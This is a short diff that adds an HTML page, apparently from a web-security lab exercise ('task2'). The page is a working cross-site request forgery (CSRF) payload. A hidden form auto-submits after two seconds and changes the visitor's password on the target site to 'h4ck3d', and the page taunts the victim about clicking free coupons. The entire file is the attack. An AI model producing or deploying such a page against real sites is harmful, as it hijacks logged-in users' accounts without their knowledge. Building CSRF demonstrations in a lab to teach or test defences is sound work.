@@ -1,0 +1,23 @@
+<html>
+
+<body>
+    <p>You have been hacked! Do not click on free coupons next time ;)</p>
+    <form id="changepass" style="display: none;;" action="/task2/change-password" method="POST">
+        <div class="container">
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" value="h4ck3d" required>
+        </div>
+        <div>
+            <label for="confirm_password">Confirm password:</label>
+            <input type="password" id="confirm_password" name="confirm_password" value="h4ck3d" required>
+        </div>
+    </form>
+</body>
+
+<script>
+    setTimeout(() => {
+        document.getElementById('changepass').submit();
+    }, 2000);
+</script>
+
+</html>
